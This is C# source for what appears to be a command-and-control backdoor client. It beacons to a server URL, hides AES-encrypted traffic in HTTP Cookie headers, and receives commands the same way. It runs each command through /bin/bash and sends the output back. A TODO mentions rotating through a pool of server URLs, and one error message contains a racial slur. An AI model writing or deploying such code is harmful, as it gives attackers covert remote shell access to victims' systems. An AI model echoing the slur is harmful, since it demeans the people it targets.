using cevsn.encrn;
using cevsn.encrn.rsa;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Text;

namespace hevsn
{
    public class Hevsn
    {
        public String URL;

        public HttpClient httpClient = new HttpClient();

        public volatile string cookie = "";
        public volatile string commRecv = "randybandyindaquarry";
        public volatile string command = "";
        public RSA? rsaa;
        public AES? aes;

        public Hevsn(string urlIn, RSA rsaIn)
        {
            URL = urlIn;
            rsaa = rsaIn;
        }

        public Hevsn(string urlIn, AES aesIn)
        {
            URL = urlIn;
            aes = aesIn;
        }
        public async void getCommands(string type)
        {
            Boolean gotSth = false;
            HttpResponseMessage? resp = null;
            Console.Write("URL: " + URL + "\n");
            //Todo: if counter > sth, then replace URL with random URL from URL Pool
            while(!gotSth)
            {
                try
                {
                    HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Get, URL);
                    request.Headers.Add("Cookie", makeOutp(type));
                    resp = await httpClient.SendAsync(request);
                    command = "";
                    gotSth = true;
                    
                } catch(Exception) {
                    Console.Write("Server seems down / Waiting phase.." + "\n");
                    Thread.Sleep(3500);
                    gotSth = false;
                    command = "";
                }
                Thread.Sleep(2500);
            }
            
            foreach (KeyValuePair<string, IEnumerable<string>> myHeader in resp!.Headers)
            {
                if(myHeader.Key.Equals("Cookie"))
                {
                    foreach(string value in myHeader.Value)
                    {
                        if(value.Length > 2 && value != cookie)
                        {
                            cookie = value;
                            gotSth = true;
                        }
                    }
                }
            }
            if(gotSth)
            {
                Console.Write("Cookie: " + cookie + "\n");
                if(commRecv != cookie && cookie.Length > 2)
                {
                    //command = rsaa!.Decrypt(Convert.FromBase64String(cookie));
                    command = aes!.decrypt(cookie);
                    Console.Write("Command received: " + command + "\n");
                    gotSth = false;
                    commRecv = cookie;
                } else {
                    Console.Write("Waiting for commands...\n");
                    gotSth = false;
                    command = "";
                }   
            }     
        }
            

        public string getCommand()
        {
            return command;
        }
        public string makeOutp(string command)
        {
            //return rsaa!.Encrypt(command);
            return aes!.encrypt(command);
        }

        public async void SendOutp(string comm)
        {
            try
            {
                using (HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Get, URL))
                {
                    request.Headers.Add("Cookie", comm);
                    await httpClient.SendAsync(request);
                }
            } catch (HttpRequestException) {
                Console.Write("Failed to send command to Server!");
            }
        }

        public async void sendInit()
        {
            try
            {
                string initializer = makeOutp("est");
                HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Get, URL);

                request.Headers.Add("Cookie", initializer);
                Console.Write("Sending init...\n");
                HttpResponseMessage responserino = await httpClient.SendAsync(request);
                Console.Write("Init sent!\n");

                foreach (KeyValuePair<string, IEnumerable<string>> myHeader in responserino.Headers)
                {
                    if(myHeader.Key.Equals("Cookie"))
                    {
                        foreach(string value in myHeader.Value)
                        {
                            if(value.Length > 2 && value != cookie)
                            {
                                SendOutp(makeOutp(exec(aes!.decrypt(value))));
                            }
                        }
                        
                    }
                }
            } catch (Exception) {
                Console.Write("Niggas\n");
            }
        }

        public string exec(String cmd)
        {
            Process p = new Process();
            var escapedArgs = cmd.Replace("\"", "\\\"");

            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.FileName = "/bin/bash";
            p.StartInfo.Arguments = $"-c \"{escapedArgs}\"";
            p.StartInfo.CreateNoWindow = true;

            p.Start();

            string output = p.StandardOutput.ReadToEnd();

            p.WaitForExit();

            Console.Write("Console Output: " + output + "\n");

            return output;
        }
        public Boolean shutdown()
        {
            httpClient.CancelPendingRequests();
            httpClient.Dispose();
            httpClient.CancelPendingRequests();
            return true;
        }
    }

    
}